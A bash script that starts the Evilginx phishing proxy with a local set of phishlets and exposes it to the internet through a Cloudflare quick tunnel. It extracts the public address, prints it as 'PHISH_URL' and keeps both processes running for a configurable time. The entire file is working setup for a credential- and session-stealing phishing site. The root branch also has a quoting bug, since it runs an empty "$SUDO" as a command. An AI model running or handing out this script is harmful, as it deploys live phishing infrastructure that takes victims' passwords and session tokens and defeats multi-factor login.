#!/usr/bin/env bash
set -euo pipefail
LIMIT=${RUN_LIMIT_MINUTES:-45}
PHISHLETS_DIR="$(pwd)/phishlets"
EVILGINX=/usr/local/bin/evilginx
CLOUDFLARED=/usr/local/bin/cloudflared
if [ "$(id -u)" = "0" ]; then SUDO=""; else SUDO="sudo"; fi
"$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer > evilginx.log 2>&1 &
sleep 3
nohup "$CLOUDFLARED" tunnel --url https://localhost:443 --no-tls-verify > cloudflared.log 2>&1 &
URL=""
for i in $(seq 1 90); do
  URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
  [ -n "$URL" ] && break
  sleep 2
done
echo "===================================================="
if [ -n "$URL" ]; then
  echo "PHISH_URL=$URL"
else
  echo "NO_TUNNEL_URL_FOUND"
  tail -n 40 cloudflared.log
fi
echo "===================================================="
trap 'kill %2 %1 2>/dev/null || true' EXIT
sleep "$((LIMIT * 60))"
